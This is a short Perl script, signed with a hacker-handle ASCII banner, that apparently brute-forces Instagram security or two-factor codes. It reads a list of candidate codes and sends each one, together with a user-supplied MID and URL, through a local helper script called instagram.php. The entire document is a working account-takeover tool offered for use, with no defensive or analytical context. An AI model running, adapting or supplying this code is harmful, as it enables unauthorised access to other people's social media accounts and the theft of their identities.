use LWP::UserAgent;
system('cls');
system('color 1e');
print '
###################
# Coded By 1337r00t
###################
...........................................................................
.%%%%....%%%%%%..%%%%%%..%%%%%%.......%%%%%%\...../%%%\..../%%%\....%%%%%%.
...%%........%%......%%.....(%/.......%%....%)...%:...:%..%:...:%.....%%...
...%%....%%%%%%..%%%%%%....(%/........%%%%)%.}...%:...:%..%:...:%.....%%...
...%%........%%......%%...(%/.........%%...\%)...%:...:%..%:...:%.....%%...
.%%%%%%..%%%%%%..%%%%%%..(%...........%%....\%)...\%%%/....\%%%/......%%...
...........................................................................
\n';
print qq(
Enter MID :
> );
$mid=<STDIN>;
chomp($mid);

print qq(
Enter URL :
> );
$url=<STDIN>;
chomp($url);

print qq(
Enter Security Codes File:
> );
$codelist=<STDIN>;
chomp($codelist);
open (CODEFILE, "<$codelist") || die "[-] Can't Found The List Of Codes !";
@CODES = <CODEFILE>;
close CODEFILE;
######################
foreach $code (@CODES) {
chomp $code;
	$ua = LWP::UserAgent->new();
	$request = HTTP::Request->new(GET => "http://localhost/instagram.php?url=$url&mid=$mid&code=$code"); # Upload /src/Instagram.php
	$response = $ua->request($request);
	$output = $response->content();
	print "$output\n";
}
